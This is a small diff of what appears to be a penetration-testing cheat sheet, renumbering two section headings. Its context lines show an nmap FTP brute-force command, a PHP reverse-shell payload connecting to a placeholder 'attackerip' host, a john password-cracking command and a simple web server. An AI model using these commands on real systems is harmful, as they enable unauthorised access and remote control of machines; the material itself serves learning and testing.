@@ -106,7 +106,7 @@ nmap -Pn -A -p 21 -T4 --script=ftp-brute.nse --script-args userdb=/root/usr 10.0
 
 
 
-- # 15. netcat <a name="nc"></a>
+- # 14. netcat <a name="nc"></a>
 ```php
 <?php
  exec("/bin/bash -c 'bash -i >& /dev/tcp/attackerip/553 0>&1'");
@@ -158,7 +158,7 @@ john --format=descrypt --wordlist /usr/share/wordlists/rockyou.txt hash.txt
 
 
 
-- # 18. Simple Local Web Servers <a name="localweb"></a>
+- # 17. Simple Local Web Servers <a name="localweb"></a>
 
 ```
 python -m SimpleHTTPServer 80
